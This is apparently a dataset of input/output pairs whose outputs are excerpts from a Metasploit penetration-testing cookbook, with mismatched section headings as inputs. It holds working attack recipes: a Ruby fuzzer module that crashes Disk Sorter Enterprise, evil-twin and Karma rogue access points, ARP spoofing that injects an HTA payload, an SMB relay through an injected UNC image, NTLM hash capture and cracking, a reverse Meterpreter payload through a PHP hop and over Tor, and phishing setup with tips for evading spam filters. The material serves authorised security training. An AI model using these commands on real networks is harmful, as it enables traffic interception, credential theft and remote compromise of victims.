    "output": "Exploring Exploits Chapter 10\nWriting a simple fuzzer\nIn the last recipe, we used an HTTP fuzzer that sent a series of HTTP GET requests with\nincrementing URL lengths until the service crashed. Now, we will learn how it worked and\nbuild our own small HTTP fuzzer that can be used against Disk Sorter Enterprise.\nHow to do it...\n1. The basic template to build a fuzzer will be similar to the one we discussed for\nthe development of an auxiliary module, which should look as follows:\nclass MetasploitModule < Msf::Auxiliary\ninclude Msf::Exploit::Remote::Tcp\ninclude Msf::Auxiliary::Fuzzer\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'HTTP Fuzzer',\n'Description' => %q{Simple HTTP GET Request Fuzzer},\n'Author' => [ 'Daniel Teixeira' ],\n'License' => MSF_LICENSE\n))\nregister_options([\nOpt::RPORT(80),\nOptInt.new(\"MAXLENGTH\", [true, \"Maximum string length\",\n20000] )\n])\nend\n2. Now that we have imported the MSF libraries, created a class, and defined the\noptions, the next step will be to define the function that will establish the sock\nconnection:\ndef get_request(uri='',opts={})\n@connected = false\nconnect\n@connected = true\nsock.put(\"GET #{uri} HTTP/1.1\\r\\nHost: #{rhost}\\r\\n\\r\\n\")\nsock.get_once(-1, 1)\nend\n[ 336 ]\nExploring Exploits Chapter 10\nThe @connected instance variable is used to make the connected variable\navailable to all methods within the class. sock.put is used to send the request\nusing the TCP mixin, and sock.get_once is used get the response from the\nservice, which will time out after one second\n3. Next, we will define the main body of the fuzzer:\ndef run\nlast_req = nil\nerror = nil\ncount = 0\n1.upto(datastore['MAXLENGTH'].to_i) do |len|\ncount += 1\nreq = fuzzer_gen_string(len)\nuri = \"/\" + req\nif(count % 100 == 0)\nprint_status(\"Fuzzing with iteration #{count} using reqing\nlength #{len}\")\nend\nbegin\nr = get_request(uri,:timeout => 0.25)\nrescue ::Interrupt\nprint_status(\"Exiting on interrupt: iteration #{count} using\nreqing length #{len}\")\nraise $!\nrescue ::Exception => e\nerror = e\nensure\ndisconnect\nend\nif(not @connected)\nif(last_req)\nprint_status(\"The service may have crashed:\niteration:#{count-1} len=#{len} uri=''#{last_req}''\nerror=#{error}\")\nelse\nprint_status(\"#{error}\")\nend\nreturn\nend\n[ 337 ]"
  },
  {
    "input": "How it works...",
    "output": "Exploring Exploits Chapter 10\nlast_req = req\nend\nend\nIt begins by initializing the required variables, which hold the last request sent, the errors,\nand a counter for the number of iterations. Then, we set up a loop, under which we will\nsend the HTTP Get requests with increasing URI lengths, and wait for a response. If the\nwaiting period for the response times out, the service is considered to be down and the\niteration number, the length of the URI, and the URI are printed to the screen.\nHow it works...\nTo start working with the module, we will have to save it\nin ~/.msf4/modules/auxiliary/fuzzers/http with the name http_fuzzer.rb, then\nload the module in Metasploit and check the module options:\nmsf > use auxiliary/fuzzers/http/http_fuzzer\nmsf auxiliary(fuzzers/http/http_fuzzer) > show options\nModule options (auxiliary/fuzzers/http/http_fuzzer):\nName Current Setting Required Description\n---- --------------- -------- -----------\nMAXLENGTH 20000 yes Maximum string length\nRHOST yes The target address\nRPORT 80 yes The target port (TCP)\nmsf auxiliary(fuzzers/http/http_fuzzer) >\n[ 338 ]\nExploring Exploits Chapter 10\nNext, set the RHOST and run the module:\nmsf auxiliary(fuzzers/http/http_fuzzer) > set RHOST 192.168.216.55\nRHOST => 192.168.216.55\nmsf auxiliary(fuzzers/http/http_fuzzer) > run\n[*] 192.168.216.55:80 - Fuzzing with iteration 100 using reqing length 100\n...snip...\n[*] 192.168.216.55:80 - Fuzzing with iteration 1500 using reqing length\n1500\n[*] 192.168.216.55:80 - The service may have crashed: iteration:1572\nlen=1573\nuri=''XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n...\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nXXXXXXXX'' error=The connection was refused by the remote host\n(192.168.216.55:80).\n[*] Auxiliary module execution completed\nmsf auxiliary(fuzzers/http/http_fuzzer) >\nGreat, our fuzzing module works and it is able to crash the Disk Sorter Enterprise\nservice. This is a simple demonstration of fuzzing software using Metasploit. Generally, it is\nnot recommended you use Metasploit as a fuzzing platform for large software, but while\nperforming a penetration test, the fuzzers available in the framework are more than enough\nto get a PoC.\n[ 339 ]"
  },
  {
    "input": "Getting ready",
    "output": "11\nWireless Network Penetration\nTesting\nIn this chapter, we will cover the following recipes:\nMetasploit and wireless\nUnderstanding an evil twin attack\nConfiguring Karmetasploit\nWireless MITM attacks\nSMB relay attacks\nIntroduction\nDespite the concerns for security, wireless technology is here to stay. In fact, not only is\nwireless here to stay, but it is growing in deployment and utilization. Penetration testing of\nwireless networks can present an organization with the real risks of compromise inherent in\ntheir wireless infrastructure. In this chapter, we will be covering how Metasploit can help\nwhen performing Wi-Fi penetration testing.\nGetting ready\nIn this chapter, we will be using a Kali Linux machine with an Alfa Network card to\nperform wireless attacks, targeting client machines connected to a wireless access point."
  },
  {
    "input": "How to do it...",
    "output": "Wireless Network Penetration Testing Chapter 11\nMetasploit and wireless\nAlthough it doesn't have modules that directly exploit wireless vulnerabilities, Metasploit is\none of the best tools to use when performing wireless penetration testing. Take for example\nthe post-exploitation wireless modules, which can be used, among other things, to extract\nsaved wireless LAN profiles and get the passphrases.\nHow to do it...\n1. We will start by using the Windows Gather Wireless Current Connection Info\npost-exploitation module to gather information about the current connection on\neach wireless LAN interface, on the target machine:\n[ 341 ]\nWireless Network Penetration Testing Chapter 11\n2. Next, we can use the Windows Gather Wireless BSS Info post-exploitation\nmodule to gather information about the wireless basic service sets available to the\nvictim machine:\nUsing the output of this module we can, for example, use WiGLE, a website for\ncollecting information about the different wireless hotspots around the world, to\nfind the client machine's physical location.\n[ 342 ]\nWireless Network Penetration Testing Chapter 11\n3. The Windows Gather Wireless Profile module is probably one of the most useful\npost-exploitation modules for performing wireless penetration testing, because it\nallows us to extract saved Wireless LAN profiles and get the wireless passphrase:\nLooking at the output, we were able to obtain the SSID of the access point the\nclient is connected to, TP-LINK_F8D01B, the authentication used WPA2 with pre-\nshared key authentication, as well as the passphrase, P4ssw0rd, used for\nthe shared key.\n[ 343 ]"
  },
  {
    "input": "How to do it...",
    "output": "Wireless Network Penetration Testing Chapter 11\nUnderstanding an evil twin attack\nAn evil twin attack is a type of Wi-Fi attack where a rogue Wi-Fi access point (AP) is used\nto mimic a legitimate access point provided by a business, such as a coffee shop that offers\nfree Wi-Fi access to its customers.\nBy imitating a legitimate access point, we can trick users into connecting to it, so we can\nsteal credentials, redirect victims to malware sites, perform LLMNR, NBT-NS poisoning\nattacks, and so on.\nGetting ready\nWe will start by installing a DHCP server to dynamically configure the victim's IP setting:\napt install isc-dhcp-server -y\nNext, configure the DHCP server by editing the configuration file\nat /etc/dhcp/dhcpd.conf:\nauthoritative;\ndefault-lease-time 600;\nmax-lease-time 7200;\nsubnet 10.0.0.0 netmask 255.255.255.0\n{\noption subnet-mask 255.255.255.0;\noption broadcast-address 10.0.0.255;\noption routers 10.0.0.1;\noption domain-name-servers 8.8.8.8;\nrange 10.0.0.100 10.0.0.254;\n}\nHow to do it...\nNow that we have the required software installed, we can set up our evil twin access point.\n1. First, use the iwconfig command to find out the name of our wireless card:\nroot@kali:~# iwconfig\neth0 no wireless extensions.\nwlan0 IEEE 802.11 ESSID:off/any\nMode:Managed Access Point: Not-Associated Tx-Power=20 dBm\nRetry short limit:7 RTS thr:off Fragment thr:off\n[ 344 ]\nWireless Network Penetration Testing Chapter 11\nEncryption key:off\nPower Management:off\nlo no wireless extensions.\nroot@kali:~#\n2. Then, use the airmon-ng command from the aircrack-ng suite to start the\ninterface in monitor mode:\nroot@kali:~# airmon-ng start wlan0\nThis will create a new virtual (VAP) interface and place it in monitor mode. The\nname will depend on the drivers, but it will be something like wlan0mon.\n3. Once you have a virtual interface in monitor mode, we can use the airbase-ng\ncommand to create an evil twin access point:\nroot@kali:~# airbase-ng -c 5 -a f4:ec:38:f8:d0:1b -e TP-LINK_F8D01B\n-v wlan0mon\n08:45:23 Created tap interface at0\n08:45:23 Trying to set MTU on at0 to 1500\n08:45:23 Access Point with BSSID F4:EC:38:F8:D0:1B started.\nWhere -a f4:ec:38:f8:d0:1b is used to set the BSSID, -e TP-LINK_F8D01B\nto set the SSID, and -c 5 is used to specify the channel of the target AP.\n4. Next, configure the interface IP address using the ip command:\nroot@kali:~# ip addr add 10.0.0.1/24 dev at0\nroot@kali:~# ip link set at0 up\n5. Then, use iptables to configure the Network Address Translation (NAT):\nroot@kali:~# iptables --table nat --append POSTROUTING --out-\ninterface eth0 -j MASQUERADE\nroot@kali:~# iptables --append FORWARD --in-interface at0 -j ACCEPT\n6. Next, create the /var/lib/dhcp/dhcpd.leases file, and start the DHCP server\nin the at0 interface, using the dhcpd command:\nroot@kali:~# touch /var/lib/dhcp/dhcpd.leases\nroot@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0\n[ 345 ]"
  },
  {
    "input": "Configuring Karmetasploit",
    "output": "Wireless Network Penetration Testing Chapter 11\n7. Finally, enable IP forwarding using sysctl, which will enable packet\nforwarding on our Kali Linux machine, allowing clients to access the internet\nthrough the eth0 interface:\nroot@kali:~# sysctl -w net.ipv4.ip_forward=1\nNow that we have our evil twin AP ready, we can test it by using a tool, such\nas urlsnarf, which will output the URLs sniffed from HTTP traffic in the at0\ninterface:\nConfiguring Karmetasploit\nDino Dai Zovi and Shane Macaulay, two security researchers, wrote a set of wireless\nsecurity tools developed as a PoC of a vulnerability and called it Karma. It was later\nintegrated with Metasploit and called Karmetasploit, which allows us to create fake access\npoints, capture passwords and dates, and conduct browser attacks against clients.\nIn the process of connecting to a wireless network, most of the operating systems often keep\nthe previous network's connections with them as the preferred networks list and send\ncontinuous probes in search of these networks. Once the network is found, the system\nautomatically connects to the network.\nIf more than one of the probed networks is found, it connects to the\nnetwork with the highest signal.\n[ 346 ]"
  },
  {
    "input": "How to do it...",
    "output": "Wireless Network Penetration Testing Chapter 11\nBecause of sending continuous probes, any adversary within this range can listen passively\nand see the networks the user is probing for. The adversary actually leverages\nvulnerabilities in the implementation of the algorithms for connecting to previous\nnetworks, so it is possible for an attacker to set up a fake access point and have the victims\nconnect to it. Once the victim is connected to the fake AP, the attacker now has an IP-level\nconnection to the victim. He can now launch any attacks against the victim.\nGetting ready\nObtain the karma.rc resource file from the Offensive Security website by running the\nfollowing command:\nroot@kali:~# curl -o karma.rc\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt\nHow to do it...\nWhen clients attach to the fake AP we run, they will be expecting to be allocated an IP\naddress.\n1. We first need to install and configure the DHCP server, if you already have not\ndone so in the previous recipe:\nroot@kali:~# apt install isc-dhcp-server -y\n2. To copy the configuration file, you can use the following command:\ncat << EOF > /etc/dhcp/dhcpd.conf\noption domain-name-servers 10.0.0.1;\ndefault-lease-time 60;\nmax-lease-time 72;\nddns-update-style none;\nauthoritative;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\nrange 10.0.0.100 10.0.0.254;\noption routers 10.0.0.1;\noption domain-name-servers 10.0.0.1;\n}\nEOF\n[ 347 ]\nWireless Network Penetration Testing Chapter 11\n3. Then, start the interface in monitor mode using airmon-ng:\nroot@kali:~# airmon-ng start wlan0\n4. Next, use airbase-ng with -P to respond to all probes regardless of the ESSIDs\nspecified, -c for the number of seconds the ESSIDs will be beaconed, and -v for\nverbose followed by the interface:\nroot@kali:~# airbase-ng -P -C 30 -e Karma -v wlan0mon\nairbase-ng has created a new interface for us, at0.\n5. We will now assign ourselves an IP address and start up our DHCP server,\nlistening on this new interface:\nroot@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0\nInternet Systems Consortium DHCP Server 4.3.5\nCopyright 2004-2016 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nConfig file: /etc/dhcp/dhcpd.conf\nDatabase file: /var/lib/dhcp/dhcpd.leases\nPID file: /var/run/dhcpd.pid\nWrote 1 leases to leases file.\nListening on LPF/at0/00:c0:ca:50:66:39/10.0.0.0/24\nSending on LPF/at0/00:c0:ca:50:66:39/10.0.0.0/24\nSending on Socket/fallback/fallback-net\nroot@kali:~#\n[ 348 ]"
  },
  {
    "input": "Wireless MITM attacks",
    "output": "Wireless Network Penetration Testing Chapter 11\n6. Now we just need to use the karma.rc resource file, wait for clients to connect,\nand get some shells:\nWireless MITM attacks\nAlthough MITM attacks are not exclusive to wireless, wireless technologies are prone to\nsuch attacks, because the adversary can perform them from a safe distance without having\nto worry about cabling and physical security.\nMITM is an attack where the attacker relays and possibly alters the communication between\ntwo parties who believe they are directly communicating with each other. Spoofing allows\nus to impersonate hosts on the network through various methods, making those hosts send\nthe traffic to our machine, rather than to the actual destination.\n[ 349 ]"
  },
  {
    "input": "How to do it...",
    "output": "Wireless Network Penetration Testing Chapter 11\nGetting ready\nIn this recipe, we will use BetterCAP, a successor of Ettercap, a well-known suite for MITM\nattacks. So, first, let's install bettercap on our Kali Linux machine:\nroot@kali:~# apt install bettercap\nHow to do it...\nWe will use BetterCAP to inject an iframe with the URL of an HTML Application (HTA).\nThe HTA will be created and hosted, using the HTA Web Server Metasploit exploit module\nand, when opened, will execute a payload via PowerShell.\n1. First, we need to create and host the HTA, using the HTA Web Server exploit\nmodule:\n[ 350 ]\nWireless Network Penetration Testing Chapter 11\n2. Then, in a new Terminal window, we will use BetterCAP to send spoof Address\nResolution Protocol (ARP) messages, associating our MAC address with the IP\naddress of the default gateway, causing any traffic meant for that IP address to be\nsent to the attacker instead, and injecting the HTA using the injecthtml proxy\nmodule:\n3. Now when the victim tries to browse to any website, an iframe will be injected\ninto the HTML code and serve the HTA:\n[ 351 ]\nWireless Network Penetration Testing Chapter 11\n4. Back in the Metasploit Terminal window, we should see a new session:\n[ 352 ]"
  },
  {
    "input": "How to do it...",
    "output": "Wireless Network Penetration Testing Chapter 11\nSMB relay attacks\nAn SMB relay attack allows us to relay SMB authentication requests to another host, gaining\naccess to an authenticated SMB session if the user has access and network logins are\nallowed on the target host. If the user has administrator access in the target host, it is\npossible to execute arbitrary commands.\nHow to do it...\nIn this recipe, we will use the MS08-068 Microsoft Windows SMB Relay Code Execution\nexploit module to perform an SMB relay attack:\n1. To use this module, we need to set the target SMB server we wish to connect to\nwith SMBHOST:\n[ 353 ]\nWireless Network Penetration Testing Chapter 11\n2. Now that we have the relay module set up and ready, create an HTML file like\nthe one following, with the IP address of the machine running the relay in the\nUNC path:\n<html>\n<body>\n<img src=\"\\\\192.168.216.5\\image.jpg\">\n</body>\n</html>\n3. Next, we will use BetterCAP to inject the HTML file, forcing the target to\nauthenticate and try to load the image:\n[ 354 ]\nWireless Network Penetration Testing Chapter 11\n4. As you can see from the screenshot, the HTML was injected, and we can see that\nthe image was not loaded:\n5. When the target tried to load the image in the injected HTML file we injected, we\nwere able to relay the authenticating and successfully execute the payload:\n[ 355 ]"
  },
  {
    "input": "There's more...",
    "output": "Wireless Network Penetration Testing Chapter 11\nThere's more...\nBecause we are only able to gain command execution if the user is an administrator on the\ntarget machine, during a penetration test, we can still take advantage of SMB authentication\nand try to capture the challenge-response password hashes from SMB client systems. For\nthat, we can use the Authentication Capture: SMB auxiliary module, and when the target\ntries to load the image in the injected HTML file, we will capture the NTLM Version 2\nauthentication hashes:\n[ 356 ]\nWireless Network Penetration Testing Chapter 11\nNow that we have the NTLM version 2 hashes, we can use John the Ripper to crack the\npasswords:\nAnother option is to use the LLMNR Spoofer auxiliary module instead of BetterCAP. Link-\nLocal Multicast Name Resolution (LLMNR) is the successor of NetBIOS and is used for\nname resolution in Windows Vista and up. The LLMNR Spoofer auxiliary module will\nforge LLMNR responses by listening for LLMNR requests sent to the LLMNR multicast\naddress (224.0.0.252), and respond with the IP address of our machine:\n[ 357 ]\nWireless Network Penetration Testing Chapter 11\nAfter capturing the NTLM version 2 hashes, we can use John the Ripper again to crack the\npasswords:\n[ 358 ]"
  },
  {
    "input": "Introduction",
    "output": "12\nCloud Penetration Testing\nIn this chapter, we will cover the following recipes:\nMetasploit in the cloud\nMetasploit PHP Hop\nPhishing from the cloud\nSetting up a cloud penetration testing lab\nIntroduction\nWith the growth of cloud computing, tests for cloud-based applications, services, and\ninfrastructures are on the rise. When performing penetration tests on cloud deployments,\none of the biggest concerns is shared ownership. In the past, when performing a penetration\ntest, the organization would own all the components on the network and we were able to\ntest them all; in a cloud environment, depending on the deployment and service model, we\ncan be presented with a very limited scope."
  },
  {
    "input": "Metasploit in the cloud",
    "output": "Cloud Penetration Testing Chapter 12\nBefore we start using cloud computing as penetration testers, let me first get some terms out\nof our way:\nThe provider is the entity that built the cloud deployment, and it is offering a\nservice to one or more tenants; tenants are the ones who contract the service from\nthe provider.\nInfrastructure as a Service (IaaS): This is a cloud service model where\nthe provider supplies the hardware and the network connectivity, and the tenant\nis responsible for the virtual machine and all the software running on it. This\nmeans that most components will be in scope.\nPlatform as a Service (PaaS): In this model, the provider is responsible for the\nhardware, network connectivity, and components required to run the application,\noperating system, and dependencies; the tenant only supplies and maintains the\napplication.\nSoftware as a Service (SaaS): SaaS is a turnkey solution; all the components are\nsupplied and maintained by the provider, where we can do little to no testing.\nMetasploit in the cloud\nIn previous chapters, I have already shown you that we use Metasploit in a\nDigitalOcean Droplet. In this recipe, I will show you how to do it and which other options\nwe have to deploy Metasploit in the cloud.\n[ 360 ]"
  },
  {
    "input": "Getting ready",
    "output": "Cloud Penetration Testing Chapter 12\nGetting ready\nAfter creating our DigitalOcean account, before we can install Metasploit we need to create\na new Droplet. DigitalOcean calls its cloud servers Droplets meaning that we will be using\nInfrastructure as a Service to deploy Metasploit.\n[ 361 ]\nCloud Penetration Testing Chapter 12\nIn this recipe, we will use the Ubuntu 16.04.3 x64 Droplet with 4 GB memory and an 80 GB\ndisk, which is more than enough for most of our needs.\nAfter selecting the distribution for our Droplet, scroll to the bottom of the page, choose a\nhostname, and create the Droplet.\n[ 362 ]\nCloud Penetration Testing Chapter 12\nAfter less than a minute, we should have our Droplet up-and-running.\nNow double-click on the Droplet name to access its menu.\n[ 363 ]"
  },
  {
    "input": "How to do it...",
    "output": "Cloud Penetration Testing Chapter 12\nAccess the Droplet console and we can use the Launch Console option to open a VNC\nconnection to the Droplet or use SSH with the root username and the password provided\nin the Droplet creation email.\nHow to do it...\nNow that we have our Droplet running, we can use the Metasploit quick installation script\nto install Metasploit:\ncurl\nhttps://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t\nemplates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod\n755 msfinstall && ./msfinstall\n[ 364 ]\nCloud Penetration Testing Chapter 12\nFinally, we can use msfconsole to launch Metasploit:\n[ 365 ]"
  },
  {
    "input": "There's more...",
    "output": "Cloud Penetration Testing Chapter 12\nThere's more...\nAlthough running Metasploit in the cloud with DigitalOcean is quite simple and quick, we\nare not limited to DigitalOcean. Next, we will see how to run Metasploit in Microsoft\nAzure. First, log in or create an account in Azure at https:/​/​www.​azure.​com.\n[ 366 ]\nCloud Penetration Testing Chapter 12\nBecause Kali Linux is available in the Azure Marketplace, we can spin up a Kali machine\nfrom the Azure Marketplace in just a few seconds and use Metasploit along with all the\ntools available in Kali Linux, as we did in previous chapters in this book.\n[ 367 ]\nCloud Penetration Testing Chapter 12\nSimply create the Kali Linux virtual machine and configure it as any other Linux Azure\nVirtual Machine.\nUse SSH public key authentication as the authentication type because it is\na robust, more secure alternative to logging in with an account password.\n[ 368 ]\nCloud Penetration Testing Chapter 12\nNowadays, it could not be easier to deploy virtual machines for penetration testing\npurposes. With Kali Linux available in many cloud platforms such as Azure or Amazon\nAWS, our life just got a lot easier. As all cloud platforms offer free trials; you can create an\naccount and start testing right away for free.\nIf you do not want to go to the trouble of deploying a new system just to run Metasploit,\nyou can also use Google Cloud Shell.\n[ 369 ]"
  },
  {
    "input": "How to do it...",
    "output": "Cloud Penetration Testing Chapter 12\nMetasploit PHP Hop\nIn this recipe, you will learn how to use the Windows Meterpreter (Reflective Injection) and\nReverse Hop HTTP/HTTPS Stage payload. This payload allows us to tunnel communication\nover an HTTP or HTTPS hop point. First, we need to upload the hop.php file located in the\nmetasploit-framework/data/php/ directory to a remote server. I will use the\nDigitalOcean Droplet created in the previous recipe, but you can use any web server with\nPHP.\nGetting ready\nFirst, we have to install Apache and PHP, so we can use the following command:\nroot@Metasploit:~# apt install apache2 php7 libapache2-mod-php7\nNext, copy hop.php to the /var/www/html/ folder and start the Apache2 service:\nroot@Metasploit:~# systemctl start apache2\nHow to do it...\n1. Now that we have our PHP Hop ready, we can use\nthe windows/meterpreter/reverse_hop_http payload and create a binary\nwith which we can compromise the target machine:\n2. After creating the payload, upload it to the target and start a listener using\nthe Generic Payload Handler exploit module:\n[ 370 ]"
  },
  {
    "input": "Getting ready",
    "output": "Cloud Penetration Testing Chapter 12\nAs soon as the victim runs the payload, we get a new session on the target via our Hop\nrelay.\nSome Metasploit modules, because of updates and changes in the\nframework, may have a slightly different behavior, some might even work\nmore accurately in one release than others. For this reason, I advise you to\nhave multiple virtual machines with different releases of the framework.\nYou can download different versions of the Metasploit framework from\nhttps:/​/​github.​com/​rapid7/​metasploit-​framework/​wiki/​Downloads-\nby-​Version.\nPhishing from the cloud\nPhishing is one of the most effective ways to get access to an organization, however,\ncreating a phishing campaign can be a daunting task, especially if your mail server ends up\nbeing blocked. For this reason, using cloud services to host our phishing framework and\nserve our phishing emails can be an excellent way to solve our problem.\n[ 371 ]\nCloud Penetration Testing Chapter 12\nGetting ready\nFor our phishing campaign, we can use Gophish, a phishing framework that makes it\neasy to test an organization's exposure to phishing. To start, you can download Gophish\nfrom the official site https:/​/​getgophish.​com; then, extract and run gophish.\nTo change the configuration, edit the config.json file. In this recipe, I have changed\nlisten_url in the administration dashboard from 127.0.0.1:3333 to 0.0.0.0:3333,\nwhich will allow us to create and launch a new campaign from our browser. Do not forget\nto change the default password of the administration page:\n{\n\"admin_server\" : {\n\"listen_url\" : \"0.0.0.0:3333\",\n\"use_tls\" : true,\n\"cert_path\" : \"gophish_admin.crt\",\n\"key_path\" : \"gophish_admin.key\"\n},\n\"phish_server\" : {\n\"listen_url\" : \"0.0.0.0:80\",\n\"use_tls\" : false,\n\"cert_path\" : \"example.crt\",\n\"key_path\": \"example.key\"\n},\n\"db_name\" : \"sqlite3\",\n\"db_path\" : \"gophish.db\",\n\"migrations_prefix\" : \"db/db_\"\n}\n[ 372 ]"
  },
  {
    "input": "How to do it...",
    "output": "Cloud Penetration Testing Chapter 12\nIf you want to improve the chances of your campaign not been caught,\nyou can use Let's Encrypt to generate a free TLS certificate and use it to\nconfigure Gophish to serve the phishing URL via HTTPS.\nHow to do it...\nNow that we have the framework ready, we can use the administration dashboard to\nconfigure the phishing campaign.\n[ 373 ]\nCloud Penetration Testing Chapter 12\nTo send emails, you first need to configure the SMTP relay details in the Sending Profiles\nsection:\nWhen setting up an email server for phishing campaigns, do not forget to configure SPF,\nDKIM, and DMARC as you would in a regular email server; this will make your server look\nlegitimate and give you a better chance of bypassing anti-spam technologies.\n[ 374 ]\nCloud Penetration Testing Chapter 12\nOne way to ensure your phishing emails will get to the intended recipients is to use hosted\nbusiness email solutions such as Zoho Mail. Just go to\nhttps://www.zoho.com/mail/, create a free business email account, and you are good to\ngo. It even allows you to set up a custom domain, which you can use to reinforce your\nphishing campaign pretext.\nIn this recipe, I will not cover how to set up and configure a phishing campaign with\nGophish. You can find the updated documentation at https:/​/​gophish.​gitbooks.​io/\nuser-​guide/​content/​getting_​started.​html. The objective of this recipe is to show you\nthat you can and should take advantage of cloud technologies to ease some of the tasks\nperformed during a penetration test.\nNow that you know how to set up and launch a phishing campaign, you can, for example,\nembed an HTML application link in the phishing email using the Metasploit HTA Web\nServer exploit module in order to compromise the target.\n[ 375 ]"
  },
  {
    "input": "How to do it...",
    "output": "Cloud Penetration Testing Chapter 12\nThen, when the target opens the email and runs the HTA, you will get a new session:\nImagination and practice are your friends; you are not limited to HTA. Learn from the\nadversary; by reading the latest security reports, you can learn about new attack vectors\nused in the wild and mimic them using Metasploit.\nSetting up a cloud penetration testing lab\nTesting new tools and techniques is an important part of a penetration tester's job. Every\nday new tools are created and new techniques found, so keep up with the industry. We\nhave to invest a fair amount of our time practicing and mastering the tools of our\ntrade. Having a data center where we can set up a lab environment and practice is not\nalways possible and can be quite expensive. With cloud services getting cheaper, faster, and\neasier to use, we do not have an excuse not to have a penetration testing lab.\nHow to do it...\nTake for example Azure; create a free account, and you get $200 of credit to explore services\nfor 30 days. Take a look at the virtual machines available, and you will see that creating a\nlab domain like the one used in this book can be done with a couple of clicks.\nOne of the biggest concerns with deploying vulnerable machines is to keep them contained\nand not expose them to the internet. For this, we can create a virtual network, which will\ncreate a logically isolated section in Microsoft Azure with this networking service. This way,\nwe can use private IP addresses, define subnets, use our own DNS servers, and create\ncomplex network topologies using virtual appliances.\n[ 376 ]"
  },
  {
    "input": "There's more...",
    "output": "Cloud Penetration Testing Chapter 12\nTo learn more about how to create virtual networks, you can go to the following page:\nhttps:/​/​docs.​microsoft.​com/​en-​us/​azure/​virtual-​network/​quick-​create-​portal.\nGoogle Cloud Platform and Amazon Web Services (AWS) are also great cloud services on\nwhich you can build your lab on; like Azure, they also allow you to create a free account\nand test their platform, so pick up the one you like most and start practicing.\nThere's more...\nIf you just want to practice and do not want to build your own lab, you can give Hack The\nBox a try, go to https:/​/​www.​hackthebox.​eu/​, and hack your way in. Hack The Box is an\nonline platform that allows you to test your skills through a series of challenges, some\nsimulating real-world scenarios and others using a CTF approach.\nFor those who still want to practice but like doing things old-school, you can go to https:/​/\nwww.​vulnhub.​com/​, download some vulnerable machines, and spin them up on your own\nhardware.\n[ 377 ]"
  },
  {
    "input": "Best practices",
    "output": "13\nBest Practices\nIn this chapter, we will cover the following recipes:\nBest practices\nUsing Metasploit over the Tor network\nMetasploit logging\nDocumentation\nCleaning up\nIntroduction\nWith power comes responsibility; as penetration testers, we often get access to confidential\ninformation going from credentials to reports with information on how an organization can\nbe compromised. In this chapter, you will learn some of the best practices for installing,\nupgrading, configuring, and managing Metasploit and the machine on which it is installed.\nBest practices\nMaking sure that the operating system on which we are running Metasploit is trustworthy\nis our first step, so we will start by learning how to download Kali Linux and check for\nimage integrity."
  },
  {
    "input": "How to do it...",
    "output": "Best Practices Chapter 13\nHow to do it...\nTo download Kali Linux, you can go to the official download page and follow the first\ndownload link on that page.\nIn the right-hand side column, you will find the SHA 256 checksum for the image you have\ndownloaded. The checksum is designed to verify data integrity using SHA-256 (the SHA-2\nfamily with a digest length of 256 bits). To check the image file, you can use the\nbuilt-in shasum command if you are on a Mac or a Unix/Linux system, or download a tool\nsuch as QuickHash GUI, which has a graphical interface and is available for Linux,\nWindows, and Mac.\nThen, compare the hash on the left with the corresponding hash in the sha256SUM column;\nif both hashes match, then the downloaded image is almost certainly intact.\n[ 379 ]"
  },
  {
    "input": "Using Metasploit over the Tor network",
    "output": "Best Practices Chapter 13\nGuided partitioning with encrypted LVM\nTo protect data stored on our Kali Linux machine, we can use Linux Unified Key\nSetup (LUKS) to encrypt partitions and Logical Volume Management (LVM) to manage\nstorage dynamically. LVM is a device mapper target that provides logical volume\nmanagement for the Linux kernel. It is used to abstract your storage and have virtual\npartitions, making extending and shrinking easier. LUKS is the standard for Linux hard\ndisk encryption; it allows you to encrypt partitions on your machine and ensure that your\nstored data is secure even if it gets stolen.\nUsing Metasploit over the Tor network\nAlthough using Metasploit over Tor is possible, I do not advise you to do it in a penetration\ntest. Tor is an awesome project and provides some anonymity, but it will not protect\nunencrypted data from prying eyes, meaning that individuals, organizations, and\ngovernments controlling exit nodes can read data that passes through them. That said, I will\nshow you how to get a reverse Meterpreter session using Tor and Tor2web HTTP proxy,\nwhich allows the target to connect to Metasploit without having Tor installed.\n[ 380 ]"
  },
  {
    "input": "Getting ready",
    "output": "Best Practices Chapter 13\nGetting ready\nTo use Tor, we first need to install it, which can be done using the following command:\nroot@kali:~# apt install tor\nNext, you need to edit Tor's configuration file located at /etc/tor/torrc using your\nfavorite editor. Uncomment and edit the following lines:\nHiddenServiceDir /var/lib/tor/hidden_service/\nHiddenServicePort 80 10.17.0.5:9999\nNote that I have changed the HiddenServicePort IP address from 127.0.0.1 to my\nprivate IP address 10.17.0.5 and the local port 80 to 9999.\nNow that we have Tor configured, we need to start it:\nroot@kali:~# systemctl start tor\nTo verify that Tor is up-and-running, you can use the systemctl status command\nfollowed by the service to query, in this case, tor:\nroot@kali:~# systemctl status tor\n● tor.service - Anonymizing overlay network for TCP (multi-instance-master)\nLoaded: loaded (/lib/systemd/system/tor.service; enabled; vendor preset:\nenabled)\nActive: active (exited) since Mon 2018-02-12 11:28:44 UTC; 1h 21min ago\nProcess: 1294 ExecStart=/bin/true (code=exited, status=0/SUCCESS)\nMain PID: 1294 (code=exited, status=0/SUCCESS)\nTasks: 0\nMemory: 0B\nCPU: 0\nCGroup: /system.slice/tor.service\nFeb 12 11:28:44 kali systemd[1]: Starting Anonymizing overlay network for\nTCP (multi-instance-master)...\nFeb 12 11:28:44 kali systemd[1]: Started Anonymizing overlay network for\nTCP (multi-instance-master).\nFeb 12 11:40:00 kali systemd[1]: Started Anonymizing overlay network for\nTCP 